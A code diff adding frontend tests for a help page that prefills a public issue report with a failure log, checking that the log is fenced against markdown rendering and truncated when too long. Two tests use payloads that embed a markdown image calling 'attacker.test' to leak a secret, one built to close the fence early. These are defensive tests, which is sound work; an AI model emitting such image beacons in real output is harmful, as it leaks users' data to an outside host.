@@ -377,6 +377,72 @@ describe("Help — the failure log arrives with the report (#284)", () => {
     ).toBeNull();
   });
 
+  /**
+   * `api/help.py` posts this body verbatim into a public issue on the Liffy
+   * repository, and a GitHub issue body is a markdown renderer. The detail is
+   * provider output about a diff written by whoever opened the pull request,
+   * so an unfenced prefill is a path from an attacker-authored diff to rendered
+   * markdown on this repo — the same hole `defang_model_markdown` closes on the
+   * review-posting path.
+   */
+  it("fences the prefilled log so it cannot render as markdown", async () => {
+    renderWithProviders(<Help />, {
+      route: {
+        pathname: "/help",
+        state: { reportDetail: "boom ![](https://attacker.test/?d=SECRET)" },
+      },
+    });
+
+    const body = (await screen.findByRole("textbox", {
+      name: /What went wrong/i,
+    })) as HTMLTextAreaElement;
+
+    expect(body.value).toContain("```");
+    // The image sits inside the fence rather than before it.
+    expect(body.value.indexOf("```")).toBeLessThan(body.value.indexOf("!["));
+  });
+
+  it("outgrows a payload that tries to close the fence early", async () => {
+    renderWithProviders(<Help />, {
+      route: {
+        pathname: "/help",
+        state: { reportDetail: "```\n![](https://attacker.test/?d=X)\n```" },
+      },
+    });
+
+    const body = (await screen.findByRole("textbox", {
+      name: /What went wrong/i,
+    })) as HTMLTextAreaElement;
+
+    // The opening fence is longer than any run inside, so nothing in the
+    // payload can close it — the same rule `review_publisher._fence` applies.
+    const opening = body.value.trim().split("\n")[0];
+    expect(opening.length).toBeGreaterThan(3);
+    expect(body.value.split(opening).length - 1).toBe(2);
+  });
+
+  /**
+   * `ReportIn.body` is `max_length=8000` and `maxLength` on a textarea does not
+   * constrain a value React sets. An oversized prefill reached the API and
+   * 422'd, which the form rendered as "a description of at least 10 are
+   * needed" — telling the reporter their log was too short.
+   */
+  it("truncates an oversized log rather than letting it 422", async () => {
+    renderWithProviders(<Help />, {
+      route: {
+        pathname: "/help",
+        state: { reportDetail: "x".repeat(20000) },
+      },
+    });
+
+    const body = (await screen.findByRole("textbox", {
+      name: /What went wrong/i,
+    })) as HTMLTextAreaElement;
+
+    expect(body.value.length).toBeLessThan(8000);
+    expect(body.value).toContain("truncated");
+  });
+
   it("leaves the body empty for someone who just opened the page", async () => {
     renderWithProviders(<Help />, { route: "/help" });
 
